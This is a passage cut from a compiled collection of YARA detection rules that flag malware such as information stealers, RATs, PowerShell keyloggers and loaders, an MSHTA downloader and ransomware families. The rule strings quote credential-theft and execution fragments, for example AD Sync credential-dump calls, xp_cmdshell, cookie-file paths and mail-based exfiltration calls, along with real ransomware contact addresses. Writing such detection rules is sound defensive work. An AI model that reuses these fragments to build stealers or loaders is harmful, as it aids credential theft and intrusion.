	condition:
		all of ( $s_* )
}

rule SECUINFRA_SUS_Unsigned_APPX_MSIX_Manifest_Feb23_2
{
	meta:
		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "f24f7e03-3cc5-5214-b6d2-205b69898636"
		date = "2023-02-01"
		modified = "2023-02-07"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Filetypes/SUS_Unsigned_APPX_MSIX_Manifest_Feb23.yar#L1-L25"
		license_url = "N/A"
		logic_hash = "4e3de25fdad9d76cefbb191424a739368b521c4f234656c397f4122debe749fa"
		score = 65
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
		$s_capability = "runFullTrust"
		$s_peExt = ".exe"

	condition:
		uint32be( 0x0 ) == 0x3C3F786D and $xlmns and $identity and 2 of ( $s* )
}

rule RUSSIANPANDA_Darkgate_Autoit_2
{
	meta:
		description = "Detects DarkGate AutoIT script"
		author = "RussianPanda"
		id = "b30544b5-88c9-5a84-8582-f4f72b228f24"
		date = "2024-01-26"
		modified = "2024-01-26"
		reference = "https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/DarkGate/darkgate_autoit.yar#L1-L19"
		license_url = "N/A"
		hash = "e1803b01e3f187355dbeb87a0c91b76c"
		logic_hash = "dda6726d09035d6f61ca331d18ed37f032c6f6a5ab88e1754a21587f4c79ac87"
		score = 75
		quality = 85
		tags = ""

	strings:
		$h = "AU3!EA06"
		$s1 = "just_test.txt" xor(0x01-0xff)
		$s2 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s3 = "test.txt" xor(0x01-0xff)
		$s4 = "cc.txt" xor(0x01-0xff)
		$s5 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s6 = "uu.txt" xor(0x01-0xff)

	condition:
		3 of ( $s* ) and $h
}

rule RUSSIANPANDA_Sentinel_Stealer_2
{
	meta:
		description = "Detects Sentinel Stealer"
		author = "RussianPanda"
		id = "8a221d7b-8fa6-53cd-a3e8-63cc67285186"
		date = "2024-01-19"
		modified = "2024-01-19"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/SentinelStealer/sentinel_stealer.yar#L1-L14"
		license_url = "N/A"
		hash = "3a540a8a81c5a5b452f154d7875423a3"
		logic_hash = "b9d72848842ea4d26544633bb83fccd17239b28493bde3f73341eb2004d8ee0c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Sentinel.SmallerEncryptedIcon" wide
		$s2 = "SentinelSteals" wide
		$s4 = "_CorExeMain"

	condition:
		all of them
}

rule RUSSIANPANDA_Fakebat_Powershell_2
{
	meta:
		description = "Detects FakeBat PowerShell scripts"
		author = "RussianPanda"
		id = "76149a6f-c370-5e48-82cc-c89b545c0aa8"
		date = "2023-12-01"
		modified = "2023-12-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/FakeBat/fakebat_powershell.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "df6b30d97ac6c9b248fed0d901e8a0a6ad1d855483a5006b008b839d9961092a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$LoadDomen/?status=start&av=" nocase
		$s2 = "$xxx.gpg" nocase

	condition:
		all of ( $s* )
}

rule RUSSIANPANDA_Win_Mal_Koistealer_PS_2
{
	meta:
		description = "Detects KoiStealer PowerShell script"
		author = "RussianPanda"
		id = "6dfdb39c-1b6a-5969-9c2d-e09869af6e0f"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/Koi/win_mal_KoiStealer_PS.yar#L1-L12"
		license_url = "N/A"
		hash = "4f55be0b55ec67dfda42b88e9c743a2a"
		logic_hash = "8a60a1d770eb4b5048762ddfd4657fdf7a430b09eb454ae5a5bb3103460907db"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "index.php?id=$guid&subid="
		$s2 = "$config"

	condition:
		all of ( $s* )
}

rule EMBEERESEARCH_Win_Orcus_Rat_Simple_Strings_Dec_2023_2
{
	meta:
		description = "Strings observed in Orcus RAT"
		author = "Matthew @ Embee_Research"
		id = "baef6b96-bf94-5363-9186-9761a8055afd"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_orcus_rat_simple_strings_dec_2023.yar#L1-L26"
		license_url = "N/A"
		hash = "30a2a674d55d7898d304713dd2f69a043d875230ea7ebee22596ba4c640768db"
		logic_hash = "2e0a44ec2749e0fc646dfb003a2d32b3fecfa07ece72ca5a65116250d80496b8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "Orcus is a Remote Administration Tool for Windows. It allows the administrator to make changes to the system remotely." wide
		$s2 = "Orcus.Service" wide
		$s4 = "costura.orcus" wide
		$s5 = "Orcus.Commands"
		$s6 = "Orcus.Shared"
		$s7 = "Orcus.Utilities"
		$s8 = "Orcus.StaticCommands"
		$s9 = "Orcus.Plugins"

	condition:
		(5 of them )
}

rule EMBEERESEARCH_Win_Berbew_Strings_Dec_2023_2
{
	meta:
		description = "Strings observed in Berbew malware."
		author = "Matthew @ Embee_Research"
		id = "402711af-c543-5c95-ae9e-e663825b6653"
		date = "2023-12-24"
		modified = "2023-12-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_berbew_strings_dec_2023.yar#L1-L19"
		license_url = "N/A"
		hash = "24dc0af3c51118697df999d8bffcdfc9cbf0d07f2630473450dd826a1ae4b9ae"
		logic_hash = "a7f687e749ec69961777063d52678461a8e288c80037fac051d7b1a5b568d9e8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "This KEWL STUFF was coded by V. V. PUPKIN"
		$s2 = "REAL CASH, REAL BITCHEZ"
		$s3 = "Please, enter your Card Number"

	condition:
		all of them
}

rule SBOUSSEADEN_Webcreds_Regexp_B64_2
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "85283a81-5bc3-5e3f-89f6-bcc1f40f3dc2"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://github.com/orlyjamie/mimikittenz/blob/master/Invoke-mimikittenz.ps1"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L24-L43"
		license_url = "N/A"
		logic_hash = "432c812177a50c50d08feb88a1293ecb625b9b0aa6a839789da150255bc83228"
		score = 75
		quality = 75
		tags = ""

	strings:
		$p1 = "&password=" base64
		$p2 = "&login_password=" base64
		$p3 = "&pass=" base64
		$p4 = "&Passwd=" base64
		$p5 = "&PersistentCookie=" base64
		$p6 = "password%5D=" base64
		$u1 = "&username=" base64
		$u2 = "&email=" base64
		$u3 = "login=" base64
		$u4 = "login_email=" base64
		$u5 = "user%5Bemail%5D=" base64
		$reg = ".{1,"

	condition:
		3 of ( $p* ) and 3 of ( $u* ) and #reg > 3
}

rule SBOUSSEADEN_Adsync_Creddump_Wide_2
{
	meta:
		description = "AD Connect Sync Credential Extract"
		author = "SBousseaden"
		id = "ccbfa79a-924b-512a-a9e9-005567b4fe83"
		date = "2020-04-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L45-L67"
		license_url = "N/A"
		logic_hash = "e8b0ff1fa9117a98799239d37c5a0ae8be25c2c2519c4fc2a1d7f085a9ebe2e1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "private_configuration_xml" wide xor
		$s2 = "LoadKeySet" xor
		$s3 = "encrypted_configuration" wide xor
		$s4 = "GetActiveCredentialKey" xor
		$s5 = "DecryptBase64ToString" xor
		$s6 = "KeyManager" xor
		$s7 = "(LocalDB)\\.\\ADSync" wide xor
		$s8 = "mms_management_agent" wide xor
		$s9 = "keyset_id" wide xor
		$s10 = "xp_cmdshell" xor
		$s11 = "System.Data.SqlClient"
		$s12 = "Password" wide xor
		$fp1 = "mmsutils\\mmsutils.pdb"

	condition:
		5 of them and not $fp1
}

rule SBOUSSEADEN_Adsync_Creddump_Xor_2
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "e0d951ec-ec39-5f37-b5a8-ddd0b1dc588d"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L69-L89"
		license_url = "N/A"
		logic_hash = "831ed0410000ad9dfa7be2ab1f64a4130810465cf699bb3e45c93075db6fdb74"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" xor
		$a2 = "LoadKeySet" xor
		$a3 = "encrypted_configuration" xor
		$a4 = "GetActiveCredentialKey" xor
		$a5 = "DecryptBase64ToString" xor
		$a6 = "Cryptography.KeyManager" xor
		$b1 = "mms_management_agent" xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" xor
		$b3 = "xp_cmdshell" xor
		$b4 = "Password" xor
		$b5 = "forest-login-user" xor
		$b6 = "forest-login-domain" xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_V64_2
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "9f536ff2-95b6-5f93-8c6f-e3738d6404c7"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L91-L111"
		license_url = "N/A"
		logic_hash = "e2465fec6dd9384d5d7f31f1c0e7661f4fbd5e3f87a14abfcb9b0412985cb1d6"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" base64
		$a2 = "LoadKeySet" base64
		$a3 = "encrypted_configuration" base64
		$a4 = "GetActiveCredentialKey" base64
		$a5 = "DecryptBase64ToString" base64
		$a6 = "Cryptography.KeyManager" base64
		$b1 = "mms_management_agent" base64
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" base64
		$b3 = "xp_cmdshell" base64
		$b4 = "Password" base64
		$b5 = "forest-login-user" base64
		$b6 = "forest-login-domain" base64

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_Xwide_2
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "a8c3e60a-99b8-50c8-992c-fbe18499a615"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L112-L132"
		license_url = "N/A"
		logic_hash = "9015005494cb3cc52645a9c82f6179992942243a816b05273bc26f58ac70a2e0"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" wide xor
		$a2 = "LoadKeySet" wide xor
		$a3 = "encrypted_configuration" wide xor
		$a4 = "GetActiveCredentialKey" wide xor
		$a5 = "DecryptBase64ToString" wide xor
		$a6 = "Cryptography.KeyManager" wide xor
		$b1 = "mms_management_agent" wide xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" wide xor
		$b3 = "xp_cmdshell" wide xor
		$b4 = "Password" wide xor
		$b5 = "forest-login-user" wide xor
		$b6 = "forest-login-domain" wide xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule ELCEEF_HTML_Windows_Search_Abuse_2
{
	meta:
		description = "Detects HTML files abusing Windows system functionalities to redirect and download malicious payloads"
		author = "marcin@ulikowski.pl"
		id = "537cb46e-4cfc-517c-8d6d-0019f2c3e5ef"
		date = "2024-06-15"
		modified = "2024-06-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/HTML_Windows_Search.yara#L1-L22"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "6a0d490cf08ab0aad3c535645abe9ebc26d12768cf2a2e932cdb7ec93cf3e2bd"
		score = 75
		quality = 73
		tags = ""
		hash1 = "d136dcfc355885c502ff2c3be229791538541b748b6c07df3ced95f9a7eb2f30"

	strings:
		$location1 = "location.href" wide ascii
		$location2 = "location.replace(" wide ascii
		$location3 = "location.assign(" wide ascii
		$metarefresh = "<meta http-equiv=\"refresh\"" nocase wide ascii
		$search1 = "\"search-ms:query=" wide ascii
		$search2 = "\"search:query=" wide ascii
		$search3 = "URL=search:query=" wide ascii
		$crumb1 = "&crumb=location:" wide ascii
		$crumb2 = "&amp;crumb=location:" wide ascii

	condition:
		( any of ( $location* ) or $metarefresh ) and any of ( $search* ) and any of ( $crumb* )
}

rule ELCEEF_Base64_SVG_Javascript_2
{
	meta:
		description = "Detects base64 encoded SVG objects containing Javascript"
		author = "marcin@ulikowski.pl"
		id = "99275772-1f4f-5616-9a9c-f76b613fe143"
		date = "2022-10-25"
		modified = "2022-12-12"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Base64_SVG_Javascript.yara#L1-L16"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "e4cb08ccc75dc00b518c4ee1495409ae6bb99e7d493be55312b8d39aa9099cfc"
		score = 75
		quality = 75
		tags = ""
		hash1 = "fe394a59e961c3fbcc326e7d0ee5909596de55249e669bc4da0aed172c11fda8"
		hash2 = "f0c94f2705b1aea17f4a6c6d71c6ed725fe71bf66b03b0117060010859ca8a19"

	strings:
		$svg = "\"data:image/svg+xml;base64" wide ascii
		$js = "<script type=\"text/javascript\">" base64

	condition:
		all of them
}

rule CRAIU_Susp_Ios_Shutdown_2
{
	meta:
		description = "Detect shutdown.log files from sysdiags with suspicious entries"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "08aa1fb9-7af0-515a-91a8-09ed35e48155"
		date = "2023-12-28"
		modified = "2024-03-05"
		reference = "https://securelist.com/shutdown-log-lightweight-ios-malware-detection-method/111734/"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/susp_ios_shutdown.yara#L2-L25"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		logic_hash = "936101f2dddb73f6dda41be47d775199c458aa4fecdcf348ed479da620343ea1"
		score = 65
		quality = 85
		tags = ""
		version = "1.0"
		tlp = "TLP:CLEAR"

	strings:
		$a1 = "these clients are still here:"
		$b1 = "/private/var/db/"
		$b2 = "/private/var/tmp/"
		$c1 = "After "

	condition:
		($c1 at 0 ) and $a1 and ( any of ( $b* ) )
}

rule DITEKSHEN_MALWARE_Win_Qulab_2
{
	meta:
		description = "Qulab information stealer payload or artifacts"
		author = "ditekSHen"
		id = "6ae24c67-5700-5330-a3bd-d542162faebb"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L959-L983"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "659d828cbef38c6362b612be9bdc05ae820f49c23684e77af6462ea677133284"
		score = 75
		quality = 75
		tags = ""
		clamav_sig = "MALWARE.Win.Trojan.QulabZ-Stealer"

	strings:
		$x1 = "QULAB CLIPPER + STEALER" ascii wide
		$x2 = "MASAD CLIPPER + STEALER" ascii wide
		$x3 = "http://teleg.run/Qulab" ascii wide
		$x4 = "http://teleg.run/jew_seller" ascii wide
		$x5 = "BUY CLIPPER + STEALER" ascii wide
		$s1 = "\\Screen.jpg" ascii wide
		$s2 = "attrib +s +h \"" ascii wide
		$s3 = "\\x86_microsoft-windows-" ascii wide
		$s4 = "\\amd64_microsoft-windows-" ascii wide
		$s5 = "Desktop TXT File" ascii wide
		$s6 = "\\AutoFills.txt" ascii wide
		$s7 = "\\CreditCards.txt" ascii wide
		$s8 = "a -y -mx9 -ssw" ascii wide
		$s9 = "\\Passwords.txt" ascii wide
		$s10 = "\\Information.txt" ascii wide
		$s11 = "\\getMe" ascii wide

	condition:
		9 of them or ( ( 1 of ( $x* ) and 4 of ( $s* ) ) or 1 of ( $x* ) )
}

rule DITEKSHEN_MALWARE_Java_Pyrogenic_2
{
	meta:
		description = "Pyrogenic/Qealler infostealer payload"
		author = "ditekSHen"
		id = "2b9268f0-2f73-51ad-ab72-9289e42e5bb1"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1434-L1446"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bb8cb939f06a376f72dcbbb1f04ec34526f72c3bcc3b146b905a8466826d2c24"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "bbb6fec5ebef0d93" ascii wide
		$s2 = "2a898bc98aaf6c96f2054bb1eadc9848eb77633039e9e9ffd833184ce553fe9b" ascii wide
		$s3 = "addShutdownHook" ascii wide
		$s4 = "obfuscated/META-INF/QeallerV" ascii wide
		$s5 = "globalIpAddress" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_Quilclipper_2
{
	meta:
		description = "Detects QuilClipper variants mostly in memory or extracted AutoIt script"
		author = "ditekSHen"
		id = "bd23ec5a-f21a-5133-a77a-de2615933b82"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4076-L4094"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dcac93806a438b188ae70a679301cb6630b9eb6849bf8fbbb1cea5fed5e7cf75"
		score = 75
		quality = 75
		tags = ""

	strings:
		$cnc1 = "QUILCLIPPER by" ascii
		$cnc2 = "/ UserName:" ascii
		$cnc3 = "/ System:" ascii
		$s1 = "DLLCALL ( \"kernel32.dll\" , \"handle\" , \"CreateMutexW\" , \"struct*\"" ascii
		$s2 = "SHELLEXECUTE ( @SCRIPTFULLPATH , \"\" , \"\" , FUNC_" ascii
		$s3 = "CASE BITROTATE" ascii
		$s4 = "CASE BITXOR" ascii
		$s5 = "CLIP( FUNC_" ascii
		$s6 = "CLIPPUT (" ascii
		$s7 = "FUNC _CLIPPUTFILE(" ascii
		$s8 = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Schedule" ascii

	condition:
		all of ( $cnc* ) or all of ( $s* )
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshkeylogger_2
{
	meta:
		description = "Detects PowerShell PoshKeylogger"
		author = "ditekSHen"
		id = "a816d716-caeb-5f08-9043-29db531f9e7c"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4612-L4627"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "20bde87ded7e3b68bc554c4b9a6c2ef08514f0d47b6b144763927bede81ea540"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "::GetKeyboardState" ascii
		$s2 = "GetAsyncKeyState(" ascii
		$s3 = "::MapVirtualKey(" ascii
		$s4 = "::GetAsyncKeyState" ascii
		$s5 = "Start-Sleep" ascii
		$s6 = "send-mailmessage" ascii
		$s7 = "[System.IO.File]::AppendAllText($" ascii
		$s8 = "new-object Management.Automation.PSCredential $" ascii

	condition:
		6 of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshwifistealer_2
{
	meta:
		description = "Detects PowerShell PoshWiFiStealer"
		author = "ditekSHen"
		id = "69ac123d-b746-57f1-a488-547f9a9cdd86"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4754-L4765"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "769349360b5d22226a5339a9e8471d06731dc522475c9385c1c145a0488e0ad1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "netsh wlan export profile" ascii
		$s2 = "Send-MailMessage" ascii
		$u1 = "https://github.com/axel05869/Wifi-Grab" ascii
		$u2 = "/exploitechx/wifi-password-extractor" ascii

	condition:
		all of ( $s* ) or all of ( $u* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe01_2
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "fd44f48c-7a24-512b-8375-c9f978a8b5bd"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4907-L4920"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7dd377f6a1cc48ef8ab9d53989755fb967c89d3798b721781bc09043ba3d86f4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$rp1 = "GetType('RunPe.RunPe'" ascii
		$rp2 = "GetType(\"RunPe.RunPe\"" ascii
		$rm1 = "GetMethod('Run'" ascii
		$rm2 = "GetMethod(\"Run\"" ascii
		$s1 = ".Invoke(" ascii
		$s2 = "[Reflection.Assembly]::Load(" ascii

	condition:
		all of ( $s* ) and 1 of ( $rp* ) and 1 of ( $rm* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe02_2
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "08261054-bebc-58fe-949a-27f6e817003a"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4922-L4934"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d7677689938d3e3eb6b59b99b7e347c60214f6edf8e5f83bf85da5a5f1ad33bb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "'.Replace('" ascii nocase
		$s2 = "'aspnet_compiler.exe'" ascii
		$s3 = "[Byte[]]$" ascii
		$pe1 = "(77,90," ascii
		$pe2 = "='4D5A" ascii

	condition:
		all of ( $s* ) and ( #pe1 > 1 or #pe2 > 1 ) and #s1 > 4
}

rule DITEKSHEN_MALWARE_Win_VBS_Dlagent01_2
{
	meta:
		description = "Detects VBS MSHTA downloader"
		author = "ditekSHen"
		id = "447ea323-ecab-5f6b-b13e-0690254c754e"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L5384-L5395"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e47839a55773764aca0aebcf1078c06c729b86d1e2f18d7d64e3bb11e87f3eb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "llehS.tpircsW" ascii
		$s2 = ".Run" ascii
		$s3 = "mshta http" ascii nocase
		$s4 = "StrReverse" ascii

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshcookiestealer_2
{
	meta:
		description = "Detects PowerShell PoshCookieStealer"
		author = "ditekSHen"
		id = "7326a056-288b-534b-811d-172bd6936d7b"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L9066-L9080"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "234958098d09732675dd539e8d25c6754ba50bf92b3a19e7fef8c68d70503ec4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "\\User Data\\default\\Network\\Cookies" ascii nocase
		$s2 = "Send-ToEmail" ascii
		$s3 = "[Security.Cryptography.ProtectedData]::Unprotect($" ascii
		$s4 = "$($env:LOCALAPPDATA)\\" ascii
		$s5 = "$($env:HOMEPATH)\\" ascii
		$s6 = "|ForEach-Object ToString X2) -join ''" ascii
		$s7 = ".Attachments.Add($" ascii

	condition:
		5 of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Goldenaxe_2
{
	meta:
		description = "Detects files referencing identities associated with GoldenAxe ransomware"
		author = "ditekShen"
		id = "cd6486eb-742f-50fb-bd99-c5d778886477"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L82-L91"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2540da85880dc08b51a2d096cefd8ed3cb14ccd171b71b434ccf26e7c5f1b54b"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "xxback@keemail.me" nocase ascii wide
		$s2 = "darkusmbackup@protonmail.com" nocase ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ransomwareexx_2
{
	meta:
		description = "Detects files referencing identities associated with RansomwareEXX Linux ransomware"
		author = "ditekShen"
		id = "dfcff8cb-c50c-559e-b5b9-8c2cdac7a3dc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L142-L150"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a83ada5d29c6d62a292c4b3a1379558cddcaf63d97dbdfc6afd27cc52f6f656d"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "france.eigs@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Phobos_2
{
	meta:
		description = "Detects files referencing identities associated with Phobos ransomware"
		author = "ditekShen"
		id = "cee09220-4038-5190-b595-28f67c845588"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L152-L161"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cf9e163d2315d465afb47bf83f30d5d27e14c4cbbc1c235dcb15b75fb509ba7d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "helprecover@foxmail.com" ascii wide nocase
		$s2 = "recoverhelp2020@thesecure.biz" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Epsilon_2
{
	meta:
		description = "Detects files referencing identities associated with Epsilon ransomware"
		author = "ditekShen"
		id = "acdeb3b1-872b-5892-9dfe-2e506f767da2"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L163-L171"
